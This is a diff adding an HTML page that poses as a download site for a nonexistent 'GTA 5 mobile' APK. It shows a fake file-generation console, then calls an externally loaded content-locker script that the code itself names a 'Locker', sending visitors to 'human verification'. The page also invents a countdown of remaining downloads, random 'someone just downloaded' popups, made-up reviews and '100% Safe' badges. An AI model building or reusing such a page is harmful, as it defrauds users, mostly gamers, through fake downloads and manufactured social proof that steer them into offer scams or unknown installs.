@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Game Name - Download and play this exciting mobile game">
+    <meta name="author" content="mugig5">
+    <title>Game Name - Details & Download</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #000000;
+            --secondary-color: #4AA3FF;
+            --text-color: #FFFFFF;
+            --card-bg: #1A1A1A;
+            --hover-color: #3388FF;
+            --success-color: #4CAF50;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: var(--primary-color);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            padding: 0.8rem;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .back-button {
+            color: var(--secondary-color);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .game-container {
+            max-width: 800px;
+            margin: 60px auto 0;
+            padding: 1rem;
+        }
+
+        .game-header {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .game-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .game-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .game-info {
+            flex: 1;
+        }
+
+        .game-title {
+            font-size: 1.4rem;
+            color: var(--secondary-color);
+            margin-bottom: 0.3rem;
+        }
+
+        .game-developer {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .game-meta {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.8rem;
+            margin: 1rem 0;
+            background: var(--card-bg);
+            padding: 1rem;
+            border-radius: 12px;
+        }
+
+        .meta-item { text-align: left; }
+        .meta-label { color: var(--secondary-color); font-size: 0.8rem; }
+        .meta-value { font-weight: 500; font-size: 1rem; }
+
+        .download-section {
+            display: flex;
+            gap: 0.8rem;
+            margin: 1rem 0;
+        }
+
+        .download-btn {
+            padding: 0.8rem 1.2rem;
+            border: none;
+            border-radius: 20px;
+            background: var(--secondary-color);
+            color: white;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            display: inline-block;
+            text-align: center;
+            min-width: 120px;
+        }
+
+        .download-btn:hover { background: var(--hover-color); }
+        .screenshots-section, .reviews-section, .features-section, .why-verification-section { margin: 1.5rem 0; }
+        .section-title { font-size: 1.2rem; color: var(--secondary-color); margin-bottom: 0.8rem; }
+
+        .screenshots-container {
+            display: flex;
+            gap: 1rem;
+            overflow-x: auto;
+            padding: 0.5rem 0;
+        }
+        .screenshot { min-width: 280px; height: 157.5px; border-radius: 8px; overflow: hidden; }
+        .screenshot img { width: 100%; height: 100%; object-fit: cover; }
+        .description-section { background: var(--card-bg); padding: 1.2rem; border-radius: 12px; margin: 1.5rem 0; font-size: 0.9rem; }
+        .features-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.8rem; }
+        .feature-item { background: var(--card-bg); padding: 1rem; border-radius: 12px; text-align: center; }
+        .feature-icon { font-size: 1.5rem; margin-bottom: 0.5rem; }
+        .feature-item h3 { font-size: 0.9rem; margin-bottom: 0.3rem; }
+        .feature-item p { font-size: 0.8rem; opacity: 0.8; }
+        .review-card { background: var(--card-bg); padding: 1rem; border-radius: 12px; margin-bottom: 0.8rem; }
+        .review-header { display: flex; align-items: center; gap: 0.8rem; margin-bottom: 0.8rem; }
+        .review-avatar { width: 40px; height: 40px; border-radius: 20px; overflow: hidden; }
+        .review-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .stars { color: #FFC107; font-size: 0.8rem; }
+        .review-card p { font-size: 0.9rem; }
+        footer { background-color: var(--primary-color); color: var(--text-color); padding: 2rem 1rem; margin-top: 3rem; }
+        .footer-content { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 2rem; }
+        .footer-section h3 { color: var(--secondary-color); margin-bottom: 1rem; }
+        .footer-section ul { list-style: none; }
+        .footer-section ul li { margin-bottom: 0.5rem; }
+        .footer-section a { color: var(--text-color); text-decoration: none; transition: color 0.3s ease; }
+        .footer-section a:hover { color: var(--primary-color); }
+        .copyright { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); }
+        
+        @media (max-width: 480px) {
+            .features-grid, .game-meta { grid-template-columns: 1fr; }
+            .screenshot { min-width: 240px; height: 135px; }
+        }
+
+        /* --- APK GENERATOR CSS --- */
+        #apk-generator-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.85); z-index: 10003;
+            display: none; align-items: center; justify-content: center; padding: 1rem;
+        }
+        #apk-generator {
+            background-color: #121212; color: #fff; padding: 25px; border-radius: 15px; border: 1px solid #333;
+            width: 100%; max-width: 500px; font-family: 'Roboto Mono', monospace; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+        }
+        #apk-generator h3 { font-size: 1.2rem; color: var(--secondary-color); margin-bottom: 1rem; }
+        #console-output {
+            background-color: #000; border: 1px solid #222; height: 220px; overflow-y: auto; padding: 15px; text-align: left;
+            font-size: 0.9rem; line-height: 1.6; border-radius: 8px; margin-top: 1rem; white-space: pre-wrap;
+        }
+        #console-output p { margin: 0 0 5px 0; color: #00ff41; }
+        #console-output p.error { color: #ff4154; }
+        #console-output p.success { color: #4AA3FF; }
+        .console-cursor { display: inline-block; background-color: #00ff41; width: 10px; height: 1em; animation: blink 1s infinite; vertical-align: middle; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .progress-bar-container { background-color: #333; border-radius: 20px; margin: 20px 0 10px 0; padding: 4px; }
+        #progress-bar-fill { background: linear-gradient(90deg, #00ff41, #00c1a2); height: 15px; width: 0%; border-radius: 20px; transition: width 0.5s ease-in-out; }
+        #progress-text { font-size: 0.9rem; color: #aaa; height: 20px; }
+
+        /* --- Scarcity Bar CSS --- */
+        .scarcity-section { background-color: var(--card-bg); padding: 1rem; border-radius: 12px; margin-top: 1.5rem; }
+        .scarcity-section p { text-align: center; margin-bottom: 0.8rem; font-size: 0.9rem; }
+        .scarcity-bar { background-color: #333; border-radius: 20px; height: 10px; width: 100%; }
+        #scarcity-bar-fill { background: linear-gradient(90deg, var(--hover-color), var(--secondary-color)); height: 100%; width: 94%; border-radius: 20px; transition: width 1s linear; }
+        #scarcity-bar-fill.low { background: linear-gradient(90deg, #ff4154, #ff8c41); }
+
+        /* --- Live Activity Popup CSS --- */
+        #live-activity-popup {
+            position: fixed; bottom: 20px; left: -150%; background-color: var(--card-bg); color: var(--text-color);
+            border-radius: 12px; padding: 15px; display: flex; align-items: center; gap: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            z-index: 10001; border-left: 4px solid var(--secondary-color); transform: translateX(0); transition: left 0.5s ease-in-out;
+        }
+        #live-activity-popup.show { left: 20px; }
+        #live-activity-popup img { width: 40px; height: 40px; }
+        #live-activity-popup p { font-size: 0.9rem; margin: 0; }
+        #live-activity-popup span { font-size: 0.8rem; opacity: 0.8; }
+        @media (max-width: 480px) { #live-activity-popup { left: -150%; right: auto; width: calc(100% - 20px); } #live-activity-popup.show { left: 10px; } }
+
+        /* --- Trust Badges CSS --- */
+        .trust-badges { display: flex; justify-content: space-around; gap: 10px; margin: 1.5rem 0 0 0; flex-wrap: wrap; }
+        .badge-item { font-size: 0.8rem; color: #ccc; opacity: 0.9; }
+        
+        /* --- Why Verification Section CSS --- */
+        .why-verification-section { background: var(--card-bg); padding: 1.2rem; border-radius: 12px; border-left: 4px solid var(--success-color); }
+        .why-verification-section p { font-size: 0.9rem; opacity: 0.9; line-height: 1.7; }
+
+        /* --- Device Selection Modal CSS --- */
+        #device-selection-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.85); z-index: 10002;
+            display: none; align-items: center; justify-content: center; padding: 1rem;
+        }
+        #device-selection-modal { background-color: var(--card-bg); padding: 2rem; border-radius: 15px; text-align: center; max-width: 350px; }
+        #device-logo { width: 60px; height: 60px; margin-bottom: 1rem; }
+        #device-selection-modal h3 { font-size: 1.3rem; margin-bottom: 0.5rem; color: var(--secondary-color); }
+        #device-selection-modal p { font-size: 0.9rem; opacity: 0.8; margin-bottom: 1.5rem; }
+        #confirm-download-btn { width: 100%; padding: 1rem; border: none; border-radius: 12px; background-color: var(--success-color); color: white; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.3s ease; }
+        #confirm-download-btn:hover { background-color: #45a049; }
+        #cancel-selection-btn { display: block; margin-top: 1rem; color: #aaa; text-decoration: none; font-size: 0.9rem; }
+
+    </style>
+<link rel="me" href="https://www.blogger.com/profile/02481658088872292462" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<script type="text/javascript">
+    var aJtYJ_Bof_wpJHgc={"it":4516373,"key":"0f322"};
+</script>
+<script src="https://dlk457skl57zp.cloudfront.net/0a4c604.js"></script>
+<body>
+
+    <header>
+        <a href="index.html" class="back-button">← Back</a>
+    </header>
+
+    <main class="game-container">
+        <div class="game-header">
+            <div class="game-icon">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwbCg9MCKObnZDQAppbXNRA-lEv3OCbe6xIw&s" alt="Game Icon">
+            </div>
+            <div class="game-info">
+                <h1 class="game-title">GTA 5 mobile-V2.00 Apk </h1>
+                <p class="game-developer">GameStudio Inc.</p>
+            </div>
+        </div>
+
+        <div class="game-meta">
+            <div class="meta-item"><span class="meta-label">SIZE: </span><span class="meta-value">2.3 GB</span></div>
+            <div class="meta-item"><span class="meta-label">DOWNLOADS: </span><span class="meta-value">1.6M+</span></div>
+            <div class="meta-item"><span class="meta-label">VERSION: </span><span class="meta-value">2.1.0</span></div>
+            <div class="meta-item"><span class="meta-label">CATEGORY: </span><span class="meta-value">Action-Openworld</span></div>
+        </div>
+
+        <div class="download-section">
+            <button class="download-btn">IOS APK</button>
+            <button class="download-btn" style="background: var(--success-color)">Android APK</button>
+        </div>
+        
+        <div class="trust-badges">
+            <div class="badge-item">✔️ 100% Safe & Secure</div>
+            <div class="badge-item">🛡️ Bot Protected</div>
+            <div class="badge-item">⭐ 4.9/5.0 Rated</div>
+        </div>
+
+        <div class="scarcity-section">
+            <p>Daily Downloads Remaining: <strong id="slots-left">47</strong>/50</p>
+            <div class="scarcity-bar"><div id="scarcity-bar-fill"></div></div>
+        </div>
+
+        <section class="screenshots-section">
+            <h2 class="section-title">Screenshots</h2>
+            <div class="screenshots-container">
+                <div class="screenshot"><img src="https://i.ibb.co/gFW38v3D/gta6.jpg" alt="Screenshot 1"></div>
+                <div class="screenshot"><img src="https://i.ibb.co/3yzhZw5v/gta4.jpg" alt="Screenshot 2"></div>
+                <div class="screenshot"><img src="https://i.ibb.co/VpSJgx2h/gta5.jpg" alt="Screenshot 3"></div>
+            </div>
+        </section>
+
+        <section class="description-section">
+            <h2 class="section-title">About</h2>
+            <p>Experience stunning graphics and immersive gameplay in this action-packed adventure. Join millions of players worldwide!</p>
+        </section>
+        
+        <section class="why-verification-section">
+            <h2 class="section-title">Why is Verification Required?</h2>
+            <p>We provide these files for free, funded by our sponsors. The quick verification step proves you are a human and not a bot, which helps us prevent server overload and abuse. This ensures everyone gets a fast, secure download. Thank you for your understanding!</p>
+        </section>
+
+        <section class="reviews-section">
+            <h2 class="section-title">Player Reviews</h2>
+            <div class="review-card">
+                <div class="review-header">
+                    <div class="review-avatar"><img src="https://images.pexels.com/photos/220453/pexels-photo-220453.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" alt="Avatar"></div>
+                    <div><strong>Jason M.</strong><div class="stars">★★★★☆</div></div>
+                </div>
+                <p>Works perfectly on my Samsung S23, graphics are amazing but it drains the battery a bit. Worth it tho! Finally a mobile version.</p>
+            </div>
+            <div class="review-card">
+                <div class="review-header">
+                    <div class="review-avatar"><img src="https://images.pexels.com/photos/2379004/pexels-photo-2379004.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" alt="Avatar"></div>
+                    <div><strong>Carlos G.</strong><div class="stars">★★★★★</div></div>
+                </div>
+                <p>OMG this is real! I was skeptical at first but followed the steps and it's running smoothly on my iPhone 14. Thank you guys!</p>
+            </div>
+        </section>
+
+        <section class="features-section">
+            <h2 class="section-title">Features</h2>
+            <div class="features-grid">
+                <div class="feature-item"><div class="feature-icon">🎮</div><h3>HD Graphics</h3><p>Amazing visuals</p></div>
+                <div class="feature-item"><div class="feature-icon">🌟</div><h3>60 FPS</h3><p>Smooth gameplay</p></div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section"><h3>About Us</h3><p>Your ultimate destination for mobile gaming. Download the latest and most popular mobile games.</p></div>
+            <div class="footer-section"><h3>Quick Links</h3><ul><li><a href="#">Home</a></li><li><a href="#">Categories</a></li><li><a href="#">Top Games</a></li><li><a href="#">Contact</a></li></ul></div>
+            <div class="footer-section"><h3>Contact Us</h3><ul><li>Email: contact@gameportal.com</li><li>Phone: +1 234 567 890</li><li>Address: Gaming Street 123</li></ul></div>
+        </div>
+        <div class="copyright"><p>© 2025 GamePortal. All rights reserved.</p></div>
+    </footer>
+
+    <!-- All Modals and Popups -->
+    <div id="apk-generator-overlay">
+        <div id="apk-generator">
+            <h3>Generating Secure Download Link</h3>
+            <div id="console-output"></div>
+            <div class="progress-bar-container"><div id="progress-bar-fill"></div></div>
+            <p id="progress-text">Initializing...</p>
+        </div>
+    </div>
+    <div id="device-selection-overlay">
+        <div id="device-selection-modal">
+            <img id="device-logo" src="" alt="Device Logo">
+            <h3>Confirm Your Device</h3>
+            <p>We need to prepare the correct file for your operating system.</p>
+            <button id="confirm-download-btn">Confirm & Start Download</button>
+            <a href="#" id="cancel-selection-btn">Cancel</a>
+        </div>
+    </div>
+    <div id="live-activity-popup">
+        <img id="globe-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Globe_icon.svg/1024px-Globe_icon.svg.png" alt="Globe Icon">
+        <div id="live-activity-text">
+            <p><strong>Someone</strong> from <strong>the United States</strong></p>
+            <span>Just downloaded GTA V Mobile!</span>
+        </div>
+    </div>
+
+    <!-- MAIN JAVASCRIPT LOGIC -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            // --- ALL ELEMENTS ---
+            const downloadButtons = document.querySelectorAll('.download-btn');
+            const generatorOverlay = document.getElementById('apk-generator-overlay');
+            const consoleOutput = document.getElementById('console-output');
+            const progressBar = document.getElementById('progress-bar-fill');
+            const progressText = document.getElementById('progress-text');
+            const deviceSelectionOverlay = document.getElementById('device-selection-overlay');
+            const deviceLogo = document.getElementById('device-logo');
+            const confirmBtn = document.getElementById('confirm-download-btn');
+            const cancelBtn = document.getElementById('cancel-selection-btn');
+            const slotsLeftText = document.getElementById('slots-left');
+            const scarcityFill = document.getElementById('scarcity-bar-fill');
+            const activityPopup = document.getElementById('live-activity-popup');
+            const activityTextP = document.querySelector('#live-activity-text p');
+
+            let isGeneratorRunning = false;
+            let selectedDevice = '';
+            
+            // --- STABLE IMAGE SOURCES ---
+            const androidLogoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Android_robot.svg/1024px-Android_robot.svg.png";
+            const iosLogoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/1000px-Apple_logo_black.svg.png";
+
+            // --- DEVICE SELECTION LOGIC ---
+            function openDeviceSelector(event) {
+                event.preventDefault();
+                selectedDevice = event.target.textContent.includes('Android') ? 'Android' : 'IOS';
+                deviceLogo.src = (selectedDevice === 'Android') ? androidLogoUrl : iosLogoUrl;
+                // For Apple logo, we need to invert color on dark background
+                if (selectedDevice === 'IOS') {
+                    deviceLogo.style.filter = 'invert(1)';
+                } else {
+                    deviceLogo.style.filter = 'none';
+                }
+                deviceSelectionOverlay.style.display = 'flex';
+            }
+            function closeDeviceSelector() { deviceSelectionOverlay.style.display = 'none'; }
+            downloadButtons.forEach(button => button.addEventListener('click', openDeviceSelector));
+            cancelBtn.addEventListener('click', (e) => { e.preventDefault(); closeDeviceSelector(); });
+            confirmBtn.addEventListener('click', () => { closeDeviceSelector(); startGenerator(); });
+
+            // --- APK GENERATOR LOGIC ---
+            function startGenerator() {
+                if (isGeneratorRunning) return; 
+                isGeneratorRunning = true;
+                
+                consoleOutput.innerHTML = '';
+                progressBar.style.width = '0%';
+                progressText.textContent = 'Initializing...';
+                generatorOverlay.style.display = 'flex';
+
+                const messages = [
+                    `Preparing file for ${selectedDevice}...`,
+                    "Initializing secure connection...",
+                    "Connecting to file server... [OK]",
+                    "Generating unique file... (78.5 MB)",
+                    { text: "Security Check: Human Verification Required!", type: "error" },
+                    { text: "Redirecting to verification...", type: "success" }
+                ];
+                
+                let messageIndex = 0;
+                function typeMessage() {
+                    if (messageIndex < messages.length) {
+                        let currentMessage = messages[messageIndex];
+                        let msgText = typeof currentMessage === 'string' ? currentMessage : currentMessage.text;
+                        let msgType = typeof currentMessage === 'string' ? 'normal' : currentMessage.type;
+
+                        const p = document.createElement('p');
+                        p.textContent = `> ${msgText}`;
+                        if (msgType === 'error') p.classList.add('error');
+                        if (msgType === 'success') p.classList.add('success');
+                        consoleOutput.appendChild(p);
+                        consoleOutput.scrollTop = consoleOutput.scrollHeight;
+
+                        let progress = ((messageIndex + 1) / messages.length) * 100;
+                        progressBar.style.width = `${progress}%`;
+                        progressText.textContent = msgText.replace('> ', '');
+
+                        messageIndex++;
+                        setTimeout(typeMessage, 1500);
+                    } else {
+                        progressText.textContent = "Complete!";
+                        if (typeof _KB === 'function') { _KB(); } 
+                        else { console.error("Locker function _KB() not found."); alert("Error: Could not load verification step."); }
+                        
+                        setTimeout(() => {
+                            generatorOverlay.style.display = 'none';
+                            isGeneratorRunning = false;
+                        }, 2000);
+                    }
+                }
+                typeMessage();
+            }
+
+            // --- SCARCITY BAR LOGIC ---
+            let slotsLeft = 47;
+            function updateSlots() {
+                if (slotsLeft > 5) { slotsLeft--; }
+                slotsLeftText.textContent = slotsLeft;
+                let percentage = (slotsLeft / 50) * 100;
+                scarcityFill.style.width = percentage + '%';
+                if (slotsLeft <= 10) { scarcityFill.classList.add('low'); }
+            }
+            setInterval(updateSlots, Math.random() * 5000 + 7000);
+
+            // --- LIVE ACTIVITY FEED LOGIC ---
+            const names = ["Mike", "John", "David", "Chris", "Sarah", "Jessica", "Emily"];
+            const countries = ["the United States", "Canada", "the UK", "Australia", "Germany"];
+            function showRandomActivity() {
+                const randomName = names[Math.floor(Math.random() * names.length)];
+                const randomCountry = countries[Math.floor(Math.random() * countries.length)];
+                activityTextP.innerHTML = `<strong>${randomName}</strong> from <strong>${randomCountry}</strong>`;
+                activityPopup.classList.add('show');
+                setTimeout(() => { activityPopup.classList.remove('show'); }, 4000);
+            }
+            setTimeout(() => { showRandomActivity(); setInterval(showRandomActivity, 6000); }, 6000);
+        });
+    </script>
+</body>
+</html>
